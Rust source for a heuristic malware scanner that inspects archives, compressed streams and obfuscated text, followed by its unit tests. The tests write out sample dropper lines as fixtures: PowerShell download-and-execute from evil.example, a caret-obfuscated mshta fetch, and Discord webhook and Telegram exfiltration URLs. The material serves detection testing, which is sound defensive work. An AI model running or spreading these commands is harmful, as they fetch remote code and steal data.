    // 4C. Decode \xNN hex escape sequences (isolated masks)
    let mut hex_decoded = Vec::new();
    let mut h_idx = 0;
    while h_idx + 3 < max_obf_scan {
        if text_buf[h_idx] == b'\\'
            && (text_buf[h_idx + 1] == b'x' || text_buf[h_idx + 1] == b'X')
        {
            if let (Some(hi), Some(lo)) =
                (hex_nibble(text_buf[h_idx + 2]), hex_nibble(text_buf[h_idx + 3]))
            {
                hex_decoded.push((hi << 4) | lo);
                h_idx += 4;
                continue;
            }
        }
        h_idx += 1;
    }
    if hex_decoded.len() >= 8 {
        let mut hex_masks = vec![0u32; compiled.content_rules.len()];
        if !is_binary_or_bytecode_buffer(&hex_decoded) {
            if let Some((sig, _)) =
                scan_raw_buffer_core(&hex_decoded, compiled, &mut hex_masks, false)
            {
                return Some((sig, "heuristic_deobfuscated_payload"));
            }
        } else {
            let ascii_hex = extract_printable_ascii_runs(&hex_decoded, 10);
            if !ascii_hex.is_empty() {
                if let Some((sig, _)) =
                    scan_raw_buffer_core(&ascii_hex, compiled, &mut hex_masks, false)
                {
                    return Some((sig, "heuristic_deobfuscated_payload"));
                }
            }
        }
    }

    None
}

pub(super) fn scan_buffer_for_compiled_content_sigs_detailed(
    buffer: &[u8],
    entry_name_lower: &str,
    compiled: &CompiledSignatures,
    allow_deep_unpack: bool,
) -> Option<(String, &'static str)> {
    if buffer.is_empty() {
        return None;
    }

    // Always detect executable masquerades & malicious shortcuts regardless of active rule set or media extension
    if let Some(masq_hit) = check_structural_masquerade(entry_name_lower, buffer) {
        return Some(masq_hit);
    }

    // Verified pure media assets (non-polyglot PNG/JPG/DDS/OGG/WAV/Font) skip content token heuristics cleanly
    if is_verified_pure_media_asset(entry_name_lower, buffer) {
        return None;
    }

    if compiled.clauses.is_empty() {
        return None;
    }

    let passive_text_context = extract_effective_extension(entry_name_lower)
        .map(is_passive_text_extension)
        .unwrap_or(false);

    let is_binary = is_binary_or_bytecode_buffer(buffer);
    let buf_len = buffer.len();

    if !is_binary {
        let mut text_masks = vec![0u32; compiled.content_rules.len()];
        if let Some(hit) =
            scan_raw_buffer_core(buffer, compiled, &mut text_masks, passive_text_context)
        {
            return Some(hit);
        }
        if allow_deep_unpack {
            if let Some(hit) = scan_text_obfuscation_layers(buffer, compiled, passive_text_context)
            {
                return Some(hit);
            }
        }
    } else {
        // Binary/compressed asset containers NEVER scan raw binary bytes directly.
        // Extract contiguous printable ASCII & UTF-16LE runs (>= 10 chars; >= 6 for Python bytecode)
        // and scan each cleanly.
        let is_py_bytecode = is_python_bytecode_context(entry_name_lower, buffer);
        let min_ascii_run = if is_py_bytecode { 6 } else { 10 };
        let ascii_runs =
            extract_printable_ascii_runs(&buffer[..buf_len.min(4 * 1024 * 1024)], min_ascii_run);
        let mut ascii_masks = vec![0u32; compiled.content_rules.len()];
        if !ascii_runs.is_empty() {
            if let Some(hit) = scan_raw_buffer_core(&ascii_runs, compiled, &mut ascii_masks, false)
            {
                return Some(hit);
            }
            if allow_deep_unpack {
                if let Some(hit) = scan_text_obfuscation_layers(&ascii_runs, compiled, false) {
                    return Some(hit);
                }
            }
        }

        let utf16_runs = extract_utf16le_ascii_runs(&buffer[..buf_len.min(2 * 1024 * 1024)], 10);
        if !utf16_runs.is_empty() {
            let mut utf16_masks = vec![0u32; compiled.content_rules.len()];
            if let Some((sig, _)) =
                scan_raw_buffer_core(&utf16_runs, compiled, &mut utf16_masks, false)
            {
                return Some((sig, "heuristic_content"));
            }
        }

        if is_py_bytecode {
            if let Some(hit) = scan_bytecode_symbol_chains(
                &buffer[..buf_len.min(4 * 1024 * 1024)],
                compiled,
                &mut ascii_masks,
                passive_text_context,
            ) {
                return Some(hit);
            }
        }
    }

    if !allow_deep_unpack || buf_len > 4 * 1024 * 1024 {
        return None;
    }

    // 5. Binary Container Zlib / Zstd Decompression Layer (capped to <= 4 MB & 12 streams)
    let mut streams_checked = 0usize;
    let max_streams = 12usize;
    let mut pos = 0usize;
    while pos + 8 < buf_len && streams_checked < max_streams {
        let b0 = buffer[pos];
        let b1 = buffer[pos + 1];

        // Check Zlib header (CMF = 0x78, FLG check bits valid)
        if b0 == 0x78
            && (b1 == 0x9C || b1 == 0x01 || b1 == 0xDA || b1 == 0x5E)
            && ((b0 as u16) * 256 + (b1 as u16)) % 31 == 0
        {
            use std::io::Read;
            let mut raw_dec = flate2::read::ZlibDecoder::new(&buffer[pos..]);
            let mut stack_probe = [0u8; 64];
            let probe_n = raw_dec.read(&mut stack_probe).unwrap_or(0);
            if probe_n >= 12 {
                streams_checked += 1;
                let max_rem = (256 * 1024usize).saturating_sub(probe_n);
                let mut decompressed = Vec::with_capacity(probe_n + 1024);
                decompressed.extend_from_slice(&stack_probe[..probe_n]);
                let _ = (&mut raw_dec).take(max_rem as u64).read_to_end(&mut decompressed);
                if let Some((sig, _)) = scan_buffer_for_compiled_content_sigs_detailed(
                    &decompressed,
                    entry_name_lower,
                    compiled,
                    false,
                ) {
                    return Some((sig, "heuristic_decompressed_stream"));
                }
                let consumed = raw_dec.total_in() as usize;
                pos += consumed.max(2);
                continue;
            }
        } else if b0 == 0x28
            && b1 == 0xB5
            && buffer[pos + 2] == 0x2F
            && buffer[pos + 3] == 0xFD
        {
            use std::io::Read;
            if let Ok(mut decoder) = zstd::stream::read::Decoder::new(&buffer[pos..]) {
                let mut stack_probe = [0u8; 64];
                let probe_n = decoder.read(&mut stack_probe).unwrap_or(0);
                if probe_n >= 12 {
                    streams_checked += 1;
                    let max_rem = (256 * 1024usize).saturating_sub(probe_n);
                    let mut decompressed = Vec::with_capacity(probe_n + 1024);
                    decompressed.extend_from_slice(&stack_probe[..probe_n]);
                    let _ = (&mut decoder)
                        .take(max_rem as u64)
                        .read_to_end(&mut decompressed);
                    if let Some((sig, _)) = scan_buffer_for_compiled_content_sigs_detailed(
                        &decompressed,
                        entry_name_lower,
                        compiled,
                        false,
                    ) {
                        return Some((sig, "heuristic_decompressed_stream"));
                    }
                }
            }
        }
        pos += 1;
    }

    None
}

fn match_archive_entry_metadata(
    raw_entry_name: &str,
    display_entry: &str,
    compiled: &CompiledSignatures,
) -> Option<HeuristicMatchDetail> {
    let entry_name = raw_entry_name.replace('\\', "/").to_lowercase();
    let entry_base = entry_name.rsplit('/').next().unwrap_or(&entry_name);

    for (sig_lower, orig) in &compiled.archive_entry_exact {
        if &entry_name == sig_lower || entry_base == sig_lower {
            return Some(HeuristicMatchDetail {
                signature: orig.clone(),
                matched_entry: Some(display_entry.to_string()),
                detection_type: "heuristic_archive_entry".to_string(),
            });
        }
    }
    for (sig_lower, orig) in &compiled.archive_entry_contains {
        if entry_name.contains(sig_lower.as_str()) {
            return Some(HeuristicMatchDetail {
                signature: orig.clone(),
                matched_entry: Some(display_entry.to_string()),
                detection_type: "heuristic_archive_entry".to_string(),
            });
        }
    }
    for (sig_lower, orig) in &compiled.file_name_exact {
        if entry_base == sig_lower {
            return Some(HeuristicMatchDetail {
                signature: orig.clone(),
                matched_entry: Some(display_entry.to_string()),
                detection_type: "heuristic_filename".to_string(),
            });
        }
    }
    if let Some(entry_ext) = extract_effective_extension(entry_base) {
        for (ext_lower, orig) in &compiled.file_extensions {
            if entry_ext == ext_lower.as_str() {
                return Some(HeuristicMatchDetail {
                    signature: orig.clone(),
                    matched_entry: Some(display_entry.to_string()),
                    detection_type: "file_extension".to_string(),
                });
            }
        }
    }
    for (sig_lower, orig) in &compiled.file_name_contains {
        if entry_base.contains(sig_lower.as_str()) {
            return Some(HeuristicMatchDetail {
                signature: orig.clone(),
                matched_entry: Some(display_entry.to_string()),
                detection_type: "heuristic_filename".to_string(),
            });
        }
    }
    None
}

pub(super) fn scan_zip_reader<R: std::io::Read + std::io::Seek>(
    reader: R,
    parent_prefix: &str,
    compiled: &CompiledSignatures,
    depth: u8,
) -> Option<HeuristicMatchDetail> {
    use std::io::Read;
    let mut archive = zip::ZipArchive::new(reader).ok()?;
    let max_entries = archive.len().min(MAX_ARCHIVE_ENTRIES);

    for i in 0..max_entries {
        if let Ok(mut entry) = archive.by_index(i) {
            let raw_entry_name = entry.name().replace('\\', "/");
            let entry_name = raw_entry_name.to_lowercase();
            let display_entry = if parent_prefix.is_empty() {
                raw_entry_name.clone()
            } else {
                format!("{}::{}", parent_prefix, raw_entry_name)
            };

            if let Some(hit) =
                match_archive_entry_metadata(&raw_entry_name, &display_entry, compiled)
            {
                return Some(hit);
            }

            const MAX_SCAN_ENTRY_BYTES: u64 = 16 * 1024 * 1024;
            let cap_hint = entry.size().min(256 * 1024) as usize;
            let mut buffer = Vec::with_capacity(cap_hint);
            let mut bounded = (&mut entry).take(MAX_SCAN_ENTRY_BYTES);
            if bounded.read_to_end(&mut buffer).is_ok() && !buffer.is_empty() {
                // Check if this entry is a nested ZIP-based script/mod archive (bounded depth)
                let is_nested_zip = depth < 2
                    && buffer.len() >= 4
                    && (buffer[0..4] == [0x50, 0x4B, 0x03, 0x04]
                        || buffer[0..4] == [0x50, 0x4B, 0x05, 0x06]);

                if is_nested_zip {
                    if let Some(nested_hit) = scan_zip_reader(
                        std::io::Cursor::new(&buffer),
                        &display_entry,
                        compiled,
                        depth + 1,
                    ) {
                        return Some(nested_hit);
                    }
                }

                if let Some((matched_sig, det_kind)) =
                    scan_buffer_for_compiled_content_sigs_detailed(
                        &buffer,
                        &entry_name,
                        compiled,
                        true,
                    )
                {
                    return Some(HeuristicMatchDetail {
                        signature: matched_sig,
                        matched_entry: Some(display_entry),
                        detection_type: det_kind.to_string(),
                    });
                }
            }
        }
    }
    None
}

pub(super) fn scan_7z_archive(
    path: &Path,
    compiled: &CompiledSignatures,
) -> Option<HeuristicMatchDetail> {
    let mut reader =
        sevenz_rust2::ArchiveReader::open(path, sevenz_rust2::Password::empty()).ok()?;

    // Pre-audit archive entry metadata BEFORE solid-stream decompression
    for entry in reader.archive().files.iter().take(MAX_ARCHIVE_ENTRIES) {
        if entry.is_directory() {
            continue;
        }
        let raw_entry_name = entry.name().replace('\\', "/");
        if let Some(hit) =
            match_archive_entry_metadata(&raw_entry_name, &raw_entry_name, compiled)
        {
            return Some(hit);
        }
    }

    const MAX_7Z_ENTRY_SCAN_BYTES: u64 = 4 * 1024 * 1024;
    const MAX_7Z_TOTAL_SCAN_BYTES: u64 = 32 * 1024 * 1024;
    let mut total_scanned: u64 = 0;
    let mut entries_seen: usize = 0;
    let mut found_hit: Option<HeuristicMatchDetail> = None;

    let _ = reader.for_each_entries(|entry, entry_reader| {
        if found_hit.is_some() || entries_seen >= MAX_ARCHIVE_ENTRIES {
            return Ok(false);
        }
        entries_seen += 1;
        if entry.is_directory() {
            return Ok(true);
        }

        let raw_entry_name = entry.name().replace('\\', "/");
        let entry_name = raw_entry_name.to_lowercase();
        let mut buf = Vec::with_capacity((entry.size().min(256 * 1024)) as usize);
        let mut bounded = entry_reader.take(MAX_7Z_ENTRY_SCAN_BYTES);
        if bounded.read_to_end(&mut buf).is_err() {
            return Ok(true);
        }
        total_scanned = total_scanned.saturating_add(buf.len() as u64);
        if total_scanned > MAX_7Z_TOTAL_SCAN_BYTES {
            return Ok(false);
        }
        if buf.is_empty() {
            return Ok(true);
        }

        let is_nested_zip = buf.len() >= 4
            && (buf[0..4] == [0x50, 0x4B, 0x03, 0x04] || buf[0..4] == [0x50, 0x4B, 0x05, 0x06]);
        if is_nested_zip {
            if let Some(nested_hit) = scan_zip_reader(
                std::io::Cursor::new(&buf),
                &raw_entry_name,
                compiled,
                1,
            ) {
                found_hit = Some(nested_hit);
                return Ok(false);
            }
        }

        if let Some((matched_sig, det_kind)) = scan_buffer_for_compiled_content_sigs_detailed(
            &buf,
            &entry_name,
            compiled,
            true,
        ) {
            found_hit = Some(HeuristicMatchDetail {
                signature: matched_sig,
                matched_entry: Some(raw_entry_name),
                detection_type: det_kind.to_string(),
            });
            return Ok(false);
        }

        Ok(true)
    });

    found_hit
}

struct TempRarScanDir(PathBuf);
impl Drop for TempRarScanDir {
    fn drop(&mut self) {
        if self.0.exists() {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
}

pub(super) fn scan_rar_archive(
    path: &Path,
    compiled: &CompiledSignatures,
) -> Option<HeuristicMatchDetail> {
    let temp_dir = TempRarScanDir(std::env::temp_dir().join(format!(
        "sanctuary_rar_scan_{}_{}",
        std::process::id(),
        uuid::Uuid::new_v4()
    )));
    const MAX_RAR_ENTRY_SCAN_BYTES: u64 = 16 * 1024 * 1024;
    const MAX_RAR_TOTAL_SCAN_BYTES: u64 = 64 * 1024 * 1024;

    let extraction = crate::utils::extract_rar_bounded_to_dir(
        path,
        &temp_dir.0,
        None,
        &None,
        MAX_RAR_ENTRY_SCAN_BYTES,
        MAX_RAR_TOTAL_SCAN_BYTES,
    )
    .ok()?;

    for entry in extraction.files.iter().take(MAX_ARCHIVE_ENTRIES) {
        let raw_entry_name = entry.rel_path.to_string_lossy().replace('\\', "/");
        if let Some(hit) =
            match_archive_entry_metadata(&raw_entry_name, &raw_entry_name, compiled)
        {
            return Some(hit);
        }
        if let Some(mut hit) = check_heuristic_malware_detailed(&entry.staged_path, compiled) {
            if hit.matched_entry.is_none() {
                hit.matched_entry = Some(raw_entry_name);
            }
            return Some(hit);
        }
    }

    None
}

fn read_chunk_up_to<R: std::io::Read>(reader: &mut R, dst: &mut Vec<u8>, max_bytes: usize) -> std::io::Result<usize> {
    dst.resize(max_bytes, 0);
    let mut filled = 0usize;
    while filled < max_bytes {
        match reader.read(&mut dst[filled..]) {
            Ok(0) => break,
            Ok(n) => filled += n,
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(e) => return Err(e),
        }
    }
    dst.truncate(filled);
    Ok(filled)
}

pub(super) fn scan_large_file_streaming(
    file: &mut std::fs::File,
    entry_name_lower: &str,
    compiled: &CompiledSignatures,
) -> Option<(String, &'static str)> {
    use std::io::{Seek, SeekFrom};

    if file.seek(SeekFrom::Start(0)).is_err() {
        return None;
    }
    let mut probe_buf = Vec::new();
    if read_chunk_up_to(file, &mut probe_buf, 64 * 1024).unwrap_or(0) == 0 {
        return None;
    }

    if let Some(masq_hit) = check_structural_masquerade(entry_name_lower, &probe_buf) {
        return Some(masq_hit);
    }
    if is_verified_pure_media_asset(entry_name_lower, &probe_buf) || compiled.clauses.is_empty() {
        return None;
    }

    let passive_text_context = extract_effective_extension(entry_name_lower)
        .map(is_passive_text_extension)
        .unwrap_or(false);
    let is_binary = is_binary_or_bytecode_buffer(&probe_buf);
    let is_py_bytecode = is_python_bytecode_context(entry_name_lower, &probe_buf);

    if file.seek(SeekFrom::Start(0)).is_err() {
        return None;
    }

    const STREAM_CHUNK_BYTES: usize = 2 * 1024 * 1024;
    const STREAM_OVERLAP_BYTES: usize = 64 * 1024;
    const MAX_LARGE_STREAM_TOTAL_BYTES: u64 = 512 * 1024 * 1024;

    let mut rule_masks = vec![0u32; compiled.content_rules.len()];
    let mut utf16_masks = vec![0u32; compiled.content_rules.len()];
    let mut overlap_tail: Vec<u8> = Vec::new();
    let mut read_buf: Vec<u8> = Vec::with_capacity(STREAM_CHUNK_BYTES);
    let mut total_read: u64 = 0;

    while total_read < MAX_LARGE_STREAM_TOTAL_BYTES {
        let to_read = (STREAM_CHUNK_BYTES as u64)
            .min(MAX_LARGE_STREAM_TOTAL_BYTES - total_read) as usize;
        let Ok(n) = read_chunk_up_to(file, &mut read_buf, to_read) else {
            break;
        };
        if n == 0 {
            break;
        }
        total_read = total_read.saturating_add(n as u64);

        let mut window = Vec::with_capacity(overlap_tail.len() + n);
        window.extend_from_slice(&overlap_tail);
        window.extend_from_slice(&read_buf[..n]);

        if !is_binary {
            if let Some(hit) =
                scan_raw_buffer_core(&window, compiled, &mut rule_masks, passive_text_context)
            {
                return Some(hit);
            }
            if let Some(hit) =
                scan_text_obfuscation_layers(&window, compiled, passive_text_context)
            {
                return Some(hit);
            }
        } else {
            let min_ascii_run = if is_py_bytecode { 6 } else { 10 };
            let ascii_runs = extract_printable_ascii_runs(&window, min_ascii_run);
            if !ascii_runs.is_empty() {
                if let Some(hit) =
                    scan_raw_buffer_core(&ascii_runs, compiled, &mut rule_masks, false)
                {
                    return Some(hit);
                }
                if let Some(hit) = scan_text_obfuscation_layers(&ascii_runs, compiled, false) {
                    return Some(hit);
                }
            }

            let utf16_runs = extract_utf16le_ascii_runs(&window, 10);
            if !utf16_runs.is_empty() {
                if let Some((sig, _)) =
                    scan_raw_buffer_core(&utf16_runs, compiled, &mut utf16_masks, false)
                {
                    return Some((sig, "heuristic_content"));
                }
            }
        }

        if n < to_read {
            break;
        }
        let tail_start = window.len().saturating_sub(STREAM_OVERLAP_BYTES);
        overlap_tail.clear();
        overlap_tail.extend_from_slice(&window[tail_start..]);
    }

    None
}

pub fn check_heuristic_malware_detailed(
    path: &Path,
    compiled: &CompiledSignatures,
) -> Option<HeuristicMatchDetail> {
    let file_name = path
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_lowercase();

    for (sig_lower, orig) in &compiled.file_name_exact {
        if &file_name == sig_lower {
            return Some(HeuristicMatchDetail {
                signature: orig.clone(),
                matched_entry: None,
                detection_type: "heuristic_filename".to_string(),
            });
        }
    }
    if let Some(ext_lower) = extract_effective_extension(&file_name) {
        for (pat_ext, orig) in &compiled.file_extensions {
            if ext_lower == pat_ext.as_str() {
                return Some(HeuristicMatchDetail {
                    signature: orig.clone(),
                    matched_entry: None,
                    detection_type: "file_extension".to_string(),
                });
            }
        }
    }
    for (sig_lower, orig) in &compiled.file_name_contains {
        if file_name.contains(sig_lower.as_str()) {
            return Some(HeuristicMatchDetail {
                signature: orig.clone(),
                matched_entry: None,
                detection_type: "heuristic_filename".to_string(),
            });
        }
    }

    if let Ok(mut file) = std::fs::File::open(path) {
        use std::io::{Read, Seek, SeekFrom};
        let mut magic = [0u8; 6];
        let magic_read = file.read(&mut magic).unwrap_or(0);
        let is_zip_container = magic_read >= 4
            && (magic[0..4] == [0x50, 0x4B, 0x03, 0x04]
                || magic[0..4] == [0x50, 0x4B, 0x05, 0x06]
                || magic[0..4] == [0x50, 0x4B, 0x07, 0x08]);
        let is_7z_container =
            magic_read == 6 && magic == [0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C];
        let is_rar_container = magic_read == 6 && &magic == b"Rar!\x1A\x07";
        let _ = file.seek(SeekFrom::Start(0));

        if is_zip_container {
            if let Some(hit) = scan_zip_reader(file, "", compiled, 0) {
                return Some(hit);
            }
            return None;
        } else if is_7z_container {
            drop(file);
            if let Some(hit) = scan_7z_archive(path, compiled) {
                return Some(hit);
            }
            return None;
        } else if is_rar_container {
            drop(file);
            if let Some(hit) = scan_rar_archive(path, compiled) {
                return Some(hit);
            }
            return None;
        } else if let Ok(metadata) = file.metadata() {
            if metadata.is_file() {
                let file_len = metadata.len();
                let max_full_read: u64 = 8 * 1024 * 1024;
                if file_len <= max_full_read {
                    let mut buffer = Vec::new();
                    let _ = file.read_to_end(&mut buffer);
                    if let Some((matched_sig, det_kind)) =
                        scan_buffer_for_compiled_content_sigs_detailed(
                            &buffer,
                            &file_name,
                            compiled,
                            true,
                        )
                    {
                        let matched_entry = if det_kind == "heuristic_decompressed_stream" {
                            Some("BinaryContainer::CompressedStream".to_string())
                        } else {
                            None
                        };
                        return Some(HeuristicMatchDetail {
                            signature: matched_sig,
                            matched_entry,
                            detection_type: det_kind.to_string(),
                        });
                    }
                } else if let Some((matched_sig, det_kind)) =
                    scan_large_file_streaming(&mut file, &file_name, compiled)
                {
                    return Some(HeuristicMatchDetail {
                        signature: matched_sig,
                        matched_entry: Some("LargeFile::StreamWindow".to_string()),
                        detection_type: det_kind.to_string(),
                    });
                }
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn encode_b64(input: &[u8]) -> String {
        const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in input.chunks(3) {
            let b0 = chunk[0] as u32;
            let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
            let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
            let n = (b0 << 16) | (b1 << 8) | b2;
            out.push(TABLE[((n >> 18) & 63) as usize] as char);
            out.push(TABLE[((n >> 12) & 63) as usize] as char);
            out.push(if chunk.len() > 1 {
                TABLE[((n >> 6) & 63) as usize] as char
            } else {
                '='
            });
            out.push(if chunk.len() > 2 {
                TABLE[(n & 63) as usize] as char
            } else {
                '='
            });
        }
        out
    }

    #[test]
    fn no_false_positives_on_legitimate_mod_assets() {
        let compiled = CompiledSignatures::new(&[]);
        let dir = std::env::temp_dir().join(format!("bytehound_fp_{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();

        let zlib_payload = {
            let mut enc = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
            enc.write_all(b"MESH\x00\x01\x02iwr\x00iex\x03\x04VERTEX\x00\x00iwr_mshtaxxx_iex")
                .unwrap();
            enc.finish().unwrap()
        };
        let mut binary_container = Vec::new();
        binary_container.extend_from_slice(b"BINC\x02\x00\x00\x00\x00iwr\x01\x02iex\x00mshtaxxx");
        binary_container.extend_from_slice(&zlib_payload);
        binary_container.extend_from_slice(b"\x00\x00<meta>http://www.w3.org/2001/XMLSchema</meta>\x00");

        let custom_with_unsafe = vec![HeuristicSignature {
            id: "unsafe_short_test".to_string(),
            signature: "iwr + iex".to_string(),
            match_type: "file_content_contains".to_string(),
            severity: "malware".to_string(),
            source: "test".to_string(),
            enabled: true,
            created_by: "test".to_string(),
            created_at: String::new(),
            notes: String::new(),
        }];
        let compiled_with_unsafe = CompiledSignatures::new(&custom_with_unsafe);
        let bin_path = dir.join("asset_bundle.bin");
        std::fs::write(&bin_path, &binary_container).unwrap();
        assert!(
            check_heuristic_malware_detailed(&bin_path, &compiled_with_unsafe).is_none(),
            "Binary asset container with compressed vertices and 3-byte entropy must not false-positive"
        );

        let cases: &[(&str, &[u8])] = &[
            ("init.script", b"-- legitimate lua game script\nlocal x = 1\n"),
            ("camera.scr_cfg", b"[camera]\nfov = 75\n"),
            ("ui.screen.xml", b"<layout><screen name=\"hud\" /></layout>"),
            ("reverbs.bank.json", b"{\"reverb\": true}"),
            ("chaos.py", b"def run():\n    return chaos.system('ok')\n"),
            (
                "localization.json",
                b"{\"label_1\": \"Local\", \"label_2\": \"Storage\", \"label_3\": \"leveldb\"}",
            ),
            (
                "README.md",
                b"# Mod Install Guide\nDownload via Invoke-WebRequest or WScript.Shell docs.\n",
            ),
            (
                "texture.png",
                b"\x89PNG\r\n\x1A\n\x00\x00\x00\rIHDR\x00\x00\x00\x01DownloadString(",
            ),
            ("launch_mod.bat", b"@echo off\necho Launching mod profile\n"),
        ];

        for (name, bytes) in cases {
            let p = dir.join(name);
            std::fs::write(&p, bytes).unwrap();
            let hit = check_heuristic_malware_detailed(&p, &compiled);
            assert!(
                hit.is_none(),
                "Expected zero false positives for {:?}, got {:?}",
                name,
                hit
            );
        }

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn detects_obfuscated_masqueraded_and_dropper_threats() {
        let compiled = CompiledSignatures::new(&[]);
        let dir = std::env::temp_dir().join(format!("bytehound_tp_{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();

        // 1. Double extension + trailing space/dot .scr payload
        let scr = dir.join("readme.txt.scr.");
        std::fs::write(&scr, b"fake").unwrap();
        assert!(check_heuristic_malware_detailed(&scr, &compiled).is_some());

        // 2. Disguised PE inside .png
        let mut fake_pe = vec![0u8; 0x90];
        fake_pe[0..2].copy_from_slice(b"MZ");
        fake_pe[0x3C..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        fake_pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        let fake_png = dir.join("preview.png");
        std::fs::write(&fake_png, &fake_pe).unwrap();
        let hit_pe = check_heuristic_malware_detailed(&fake_png, &compiled).unwrap();
        assert_eq!(hit_pe.detection_type, "masquerade_executable");

        // 3. Malicious Windows .lnk pointing to PowerShell
        let mut lnk = Vec::new();
        lnk.extend_from_slice(b"\x4C\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46");
        lnk.extend_from_slice(b"powershell -w hidden https://evil.example/drop.ps1");
        let lnk_path = dir.join("install_help.lnk");
        std::fs::write(&lnk_path, &lnk).unwrap();
        let hit_lnk = check_heuristic_malware_detailed(&lnk_path, &compiled).unwrap();
        assert_eq!(hit_lnk.detection_type, "masquerade_executable");

        // 4. PowerShell UTF-16LE Base64 encoded WebClient payload inside a script
        let raw_ps = "(New-Object System.Net.WebClient).DownloadString('https://evil.example/p.ps1') | Invoke-Expression";
        let utf16le: Vec<u8> = raw_ps.bytes().flat_map(|b| [b, 0u8]).collect();
        let ps_b64 = format!("launch {}", encode_b64(&utf16le));
        let ps_path = dir.join("helper.ps1");
        std::fs::write(&ps_path, ps_b64.as_bytes()).unwrap();
        assert!(check_heuristic_malware_detailed(&ps_path, &compiled).is_some());

        // 5. Caret-obfuscated mshta dropper
        let bat_path = dir.join("update.bat");
        std::fs::write(&bat_path, b"c^m^d /c m^s^h^t^a h^t^t^p^s://bad.example/a.hta").unwrap();
        assert!(check_heuristic_malware_detailed(&bat_path, &compiled).is_some());

        // 6. UTF-16LE wide Discord webhook inside a DLL buffer
        let mut dll_wide = vec![b'M', b'Z', 0x00, 0x00];
        for b in b"https://discord.com/api/webhooks/123456/secret" {
            dll_wide.push(*b);
            dll_wide.push(0);
        }
        let dll_path = dir.join("plugin.dll");
        std::fs::write(&dll_path, &dll_wide).unwrap();
        assert!(check_heuristic_malware_detailed(&dll_path, &compiled).is_some());

        // 7. Nested ZIP dropper inside a benign outer ZIP
        let nested_buf = std::io::Cursor::new(Vec::new());
        let mut inner_zip = zip::ZipWriter::new(nested_buf);
        let opts = zip::write::SimpleFileOptions::default();
        inner_zip.start_file("bot.py", opts).unwrap();
        inner_zip
            .write_all(b"url = 'https://api.telegram.org/bot123:abc/sendDocument'")
            .unwrap();
        let inner_bytes = inner_zip.finish().unwrap().into_inner();

        let outer_zip_path = dir.join("mod_bundle.zip");
        let outer_file = std::fs::File::create(&outer_zip_path).unwrap();
        let mut outer_zip = zip::ZipWriter::new(outer_file);
        outer_zip.start_file("scripts.zip", opts).unwrap();
        outer_zip.write_all(&inner_bytes).unwrap();
        outer_zip.finish().unwrap();
        assert!(check_heuristic_malware_detailed(&outer_zip_path, &compiled).is_some());

        // 8. Python bytecode (.pyc) marshal symbol-chain dropper
        let pyc_path = dir.join("payload.pyc");
        std::fs::write(
            &pyc_path,
            b"\xCB\x0D\x0D\x0A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00os\x00\x01system\x00\x02powershell",
        )
        .unwrap();
        assert!(check_heuristic_malware_detailed(&pyc_path, &compiled).is_some());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn streams_large_file_and_detects_mid_file_payload_past_8mib() {
        let compiled = CompiledSignatures::new(&[]);
        let dir = std::env::temp_dir().join(format!("bytehound_stream_{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();

        let large_bin_path = dir.join("padded_asset.bin");
        {
            let mut f = std::fs::File::create(&large_bin_path).unwrap();
            f.write_all(b"BINC\x01\x00\x00\x00").unwrap();
            let zero_block = vec![0u8; 1024 * 1024];
            for _ in 0..5 {
                f.write_all(&zero_block).unwrap();
            }
            // Embed malicious webhook string right at ~5 MiB offset inside a 10 MiB file
            f.write_all(b"\x00https://discord.com/api/webhooks/999888/leak\x00")
                .unwrap();
            for _ in 0..5 {
                f.write_all(&zero_block).unwrap();
            }
        }

        let hit = check_heuristic_malware_detailed(&large_bin_path, &compiled)
            .expect("Large >8 MiB streaming scanner must detect payload at 5 MiB offset");
        assert_eq!(hit.matched_entry.as_deref(), Some("LargeFile::StreamWindow"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn scans_7z_container_for_embedded_threat() {
        let compiled = CompiledSignatures::new(&[]);
        let dir = std::env::temp_dir().join(format!("bytehound_7z_{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();

        let archive_path = dir.join("threat_bundle.7z");
        {
            let mut writer = sevenz_rust2::ArchiveWriter::create(&archive_path).unwrap();
            let entry = sevenz_rust2::ArchiveEntry::new_file("scripts/stealer.py");
            let payload = b"import requests\nrequests.post('https://discord.com/api/webhooks/123/abc', json={})\n";
            writer.push_archive_entry(entry, Some(&payload[..])).unwrap();
            writer.finish().unwrap();
        }

        let hit = check_heuristic_malware_detailed(&archive_path, &compiled)
            .expect("7z archive scanner must inspect entries inside .7z containers");
        assert_eq!(hit.matched_entry.as_deref(), Some("scripts/stealer.py"));

        let _ = std::fs::remove_dir_all(&dir);
    }
}

